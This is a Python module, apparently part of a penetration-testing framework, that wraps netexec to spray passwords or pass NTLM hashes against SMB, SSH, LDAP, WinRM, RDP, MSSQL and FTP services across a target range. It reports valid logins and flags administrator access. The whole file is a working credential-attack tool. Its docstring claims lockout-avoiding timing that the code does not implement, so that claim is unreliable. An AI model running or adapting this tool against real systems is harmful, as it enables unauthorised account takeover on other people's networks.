#!/usr/bin/env python3
"""
credential_sprayer — Password spraying via netexec (nxc).

CLI deps: netexec (nxc, installed on Kali — replaces crackmapexec)

Sprays credentials across SMB, SSH, LDAP, WinRM, RDP, MSSQL, and FTP.
Designed to avoid account lockouts with controlled timing.
"""

import json
import re
import time

from base_module import TacticalModule


class CredentialSprayer(TacticalModule):
    name = "credential_sprayer"
    description = "Password spraying via netexec (nxc)"

    def _add_module_args(self) -> None:
        self.parser.add_argument(
            "--target", required=True,
            help="Target IP, hostname, or CIDR range",
        )
        self.parser.add_argument(
            "--protocol",
            choices=["smb", "ssh", "ldap", "winrm", "rdp", "mssql", "ftp"],
            default="smb",
            help="Protocol to spray (default: smb)",
        )
        self.parser.add_argument(
            "--username",
            help="Single username",
        )
        self.parser.add_argument(
            "--username-file",
            help="File with usernames",
        )
        self.parser.add_argument(
            "--password",
            help="Single password to spray",
        )
        self.parser.add_argument(
            "--password-file",
            help="File with passwords",
        )
        self.parser.add_argument(
            "--hash",
            help="NTLM hash (LM:NT format) for pass-the-hash",
        )
        self.parser.add_argument(
            "--domain",
            help="Active Directory domain",
        )
        self.parser.add_argument(
            "--continue-on-success", action="store_true",
            help="Continue spraying after finding valid creds",
        )
        self.parser.add_argument(
            "--local-auth", action="store_true",
            help="Authenticate locally instead of to domain",
        )

    def run(self, args) -> None:
        if not args.username and not args.username_file:
            self.output_error("Provide --username or --username-file")
            return
        if not args.password and not args.password_file and not args.hash:
            self.output_error("Provide --password, --password-file, or --hash")
            return
        if args.hash and not self.validate_hash(args.hash):
            self.output_error(f"Invalid NTLM hash format: {args.hash}")
            return

        nxc_args = [args.protocol, args.target]

        if args.username:
            nxc_args.extend(["-u", args.username])
        elif args.username_file:
            nxc_args.extend(["-u", args.username_file])

        if args.hash:
            nxc_args.extend(["-H", args.hash])
        elif args.password:
            nxc_args.extend(["-p", args.password])
        elif args.password_file:
            nxc_args.extend(["-p", args.password_file])

        if args.domain:
            nxc_args.extend(["-d", args.domain])
        if args.continue_on_success:
            nxc_args.append("--continue-on-success")
        if args.local_auth:
            nxc_args.append("--local-auth")

        start = time.monotonic()
        result = self.run_tool("nxc", nxc_args, timeout=args.timeout)
        duration_ms = int((time.monotonic() - start) * 1000)

        successes, failures = self._parse_output(result.stdout + result.stderr)

        self.log_run(
            args.db_path, self.name,
            json.dumps(vars(args), default=str),
            0 if successes else 1,
            result.stdout[:5000], result.stderr[:5000], duration_ms,
        )
        self.output_success({
            "target": args.target,
            "protocol": args.protocol,
            "successful_logins": successes,
            "failed_attempts": len(failures),
            "success_count": len(successes),
            "duration_ms": duration_ms,
        })

    @staticmethod
    def _parse_output(output: str) -> tuple[list[dict], list[str]]:
        """Parse netexec output for successes and failures."""
        successes: list[dict] = []
        failures: list[str] = []

        for line in output.split("\n"):
            line = line.strip()
            if not line:
                continue
            # Success: [+] or green marker with (Pwn3d!) or valid creds
            if "[+]" in line or "(Pwn3d!)" in line:
                # Extract host, user, and result
                match = re.search(
                    r"(\d+\.\d+\.\d+\.\d+)\s+.*?(\S+)\\?(\S+)\s*(.*)",
                    line,
                )
                if match:
                    successes.append({
                        "host": match.group(1),
                        "username": match.group(3),
                        "info": line[:300],
                        "admin": "(Pwn3d!)" in line,
                    })
                else:
                    successes.append({"info": line[:300]})
            elif "[-]" in line:
                failures.append(line[:200])

        return successes, failures


if __name__ == "__main__":
    CredentialSprayer().execute()
